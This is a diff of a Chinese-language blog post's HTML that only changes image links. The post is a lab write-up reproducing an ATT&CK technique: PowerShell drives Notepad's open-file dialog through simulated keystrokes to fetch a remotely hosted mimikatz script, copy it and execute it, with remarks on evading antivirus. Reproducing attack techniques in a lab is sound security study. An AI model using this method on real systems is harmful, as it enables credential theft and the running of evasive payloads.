@@ -71,28 +71,28 @@
 
 <p>&nbsp;&nbsp;&nbsp;&nbsp;在windows server 2012的环境下运行，注意要使用管理员权限：</p>
 <p><img src="/../../../../img/attck1/3.png" alt="3"><br>&nbsp;&nbsp;&nbsp;&nbsp;在复现att&amp;ck时经常会出现各种各样的报错，我已经习惯去修改里面给出的脚本了，首先看一下报错的原因:路径不正确，也就是从文件名这一栏无法去直接访问这个放在web上的mimikatz的ps1脚本。<br>&nbsp;&nbsp;&nbsp;&nbsp;那我们去尝试一下以这种思路怎么才能访问到这个mimikatz，在此电脑的路径中输入url：</p>
-<p><img src="https://github.com/qiaomu2333/qiaomu2333.github.io/blob/master/img/attck1/4.png?raw=true" alt="4"></p>
-<p><img src="https://github.com/qiaomu2333/qiaomu2333.github.io/blob/master/img/attck1/5.png?raw=true" alt><br>&nbsp;&nbsp;&nbsp;&nbsp;成功访问到了这个mimikatz.ps1！那我们试试在记事本中能否成功，首先要对脚本进行改动。因为该脚本时通过这种方式打开记事本时，光标处于文件名处而不是路径栏中，如图:</p>
-<p><img src="https://github.com/qiaomu2333/qiaomu2333.github.io/blob/master/img/attck1/6.png?raw=true" alt="图片.png"></p>
+<p><img src="/../../../../img/attck1/4.png" alt="4"></p>
+<p><img src="/../../../../img/attck1/5.png" alt><br>&nbsp;&nbsp;&nbsp;&nbsp;成功访问到了这个mimikatz.ps1！那我们试试在记事本中能否成功，首先要对脚本进行改动。因为该脚本时通过这种方式打开记事本时，光标处于文件名处而不是路径栏中，如图:</p>
+<p><img src="/../../../../img/attck1/6.png" alt="图片.png"></p>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;这段powershell是这样打开记事本，并选择打开文件选项的:</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$wshell=New-Object -ComObject WScript.Shell;</span><br><span class="line">$app=<span class="string">'Notepad'</span>;</span><br><span class="line">$curpid=$wshell.Exec($app).ProcessID;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/qiaomu2333/qiaomu2333.github.io/blob/master/img/attck1/7.png?raw=true" alt="7"></p>
+<p><img src="/../../../../img/attck1/7.png" alt="7"></p>
 <p>模拟键盘的ctrl+o，也就是打开文件选项:</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$wshell=New-Object -ComObject WScript.Shell;</span><br><span class="line">$reg=<span class="string">'HKCU:\Software\Microsoft\Notepad'</span>;</span><br><span class="line">$app=<span class="string">'Notepad'</span>;</span><br><span class="line">[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');</span><br><span class="line">@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('&#125;')[0].Split('=')[5]),@('StatusBar',0))|ForEach&#123;SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]&#125;;</span><br><span class="line">$curpid=$wshell.Exec($app).ProcessID;</span><br><span class="line">While(!($title=GPS|?&#123;(Item Variable:_).Value.id-ieq$curpid&#125;|ForEach&#123;(Variable _).Value.MainWindowTitle&#125;))&#123;Start-Sleep -Milliseconds <span class="number">500</span>&#125;;</span><br><span class="line">While(!$wshell.AppActivate($title))&#123;Start-Sleep -Milliseconds <span class="number">500</span>&#125;;</span><br><span class="line">$wshell.SendKeys(<span class="string">'^o'</span>);</span><br><span class="line">Start-Sleep -Milliseconds <span class="number">1000</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/qiaomu2333/qiaomu2333.github.io/blob/master/img/attck1/8.png?raw=true" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;使用这段命令复制记事本中的内容：</p>
+<p><img src="/../../../../img/attck1/8.png" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;使用这段命令复制记事本中的内容：</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@(<span class="string">'^a'</span>,<span class="string">'^c'</span>)|ForEach&#123;$wshell.SendKeys((Item Variable:_).Value)&#125;;</span><br></pre></td></tr></table></figure>
 
-<p>&nbsp;&nbsp;&nbsp;&nbsp;这里通过Notepad在注册表中的信息，以及powershell的GPS命令，GPS也就是cmd中的tasklist：<br><img src="https://github.com/qiaomu2333/qiaomu2333.github.io/blob/master/img/attck1/9.png?raw=true" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;这段powershell中使用c#反射，也就是System.Reflection.Assembly加载命名空间System.Windows.Forms，并使用该命名空间中的类，根据注册表以及gps命令获取的记事本的名称并在该记事本中使用的crtl+o组合键。<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.windows.forms?redirectedfrom=MSDN&view=netframework-4.7.2" target="_blank" rel="noopener">（System.Windows.Forms中的类）</a></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;这里通过Notepad在注册表中的信息，以及powershell的GPS命令，GPS也就是cmd中的tasklist：<br><img src="/../../../../img/attck1/9.png" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;这段powershell中使用c#反射，也就是System.Reflection.Assembly加载命名空间System.Windows.Forms，并使用该命名空间中的类，根据注册表以及gps命令获取的记事本的名称并在该记事本中使用的crtl+o组合键。<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.windows.forms?redirectedfrom=MSDN&view=netframework-4.7.2" target="_blank" rel="noopener">（System.Windows.Forms中的类）</a></p>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;这时我们需要在这段powershell中添加几次如下代码:</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$wshell.SendKeys(<span class="string">'&#123;tab&#125;'</span>);</span><br><span class="line">Start-Sleep -Milliseconds <span class="number">1000</span></span><br></pre></td></tr></table></figure>
 
 <p>&nbsp;&nbsp;&nbsp;&nbsp;即可将光标替换到路径栏中：</p>
-<p><img src="https://github.com/qiaomu2333/qiaomu2333.github.io/blob/master/img/attck1/10.png?raw=true" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;正当我以为胜利的曙光就在眼前时，一个报错打破了我的幻想:</p>
-<p><img src="https://github.com/qiaomu2333/qiaomu2333.github.io/blob/master/img/attck1/11.png?raw=true" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;记事本中打开文件的每个地方我都尝试了，我陷入了深深的自闭中。。。我决定换一个新的环境去尝试一下这个攻击手法。我换成了我的物理机的win10系统，直接将原版powershell命令执行:</p>
-<p><img src="https://github.com/qiaomu2333/qiaomu2333.github.io/blob/master/img/attck1/12.png?raw=true" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;这次没有报错，但是卡在了奇怪的地方，文件名那一栏输入到一半卡住了。。。我思来想去不知道这到底又是什么原因，忽然想到了刚才powershell脚本在模拟键盘的过程中出现了中文输入法，于是我是用纯英文的键盘再次执行:</p>
-<p><img src="https://github.com/qiaomu2333/qiaomu2333.github.io/blob/master/img/attck1/13.png?raw=true" alt="图片.png"></p>
+<p><img src="/../../../../img/attck1/10.png" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;正当我以为胜利的曙光就在眼前时，一个报错打破了我的幻想:</p>
+<p><img src="/../../../../img/attck1/11.png" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;记事本中打开文件的每个地方我都尝试了，我陷入了深深的自闭中。。。我决定换一个新的环境去尝试一下这个攻击手法。我换成了我的物理机的win10系统，直接将原版powershell命令执行:</p>
+<p><img src="/../../../../img/attck1/12.png" alt="图片.png"><br>&nbsp;&nbsp;&nbsp;&nbsp;这次没有报错，但是卡在了奇怪的地方，文件名那一栏输入到一半卡住了。。。我思来想去不知道这到底又是什么原因，忽然想到了刚才powershell脚本在模拟键盘的过程中出现了中文输入法，于是我是用纯英文的键盘再次执行:</p>
+<p><img src="/../../../../img/attck1/13.png" alt="图片.png"></p>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;居然开始下载了！还成功执行了mimikatz。<br>&nbsp;&nbsp;&nbsp;&nbsp;这次复现是我目前为止碰上最耗费我时间的一次复现，来来回回修改powershell代码和测试花了三个多小时左右，最后终于成功了。谈一谈这种攻击手法的免杀效果把，我发现这种手法被杀的几率取决于你下载并且复制的powershell脚本，所以不光可以使用mimikatz而且mimikatz对于win10实在太过鸡肋，但是我们可以通过这个手法去执行其他免杀过的ps1脚本，算是开拓了思路。</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
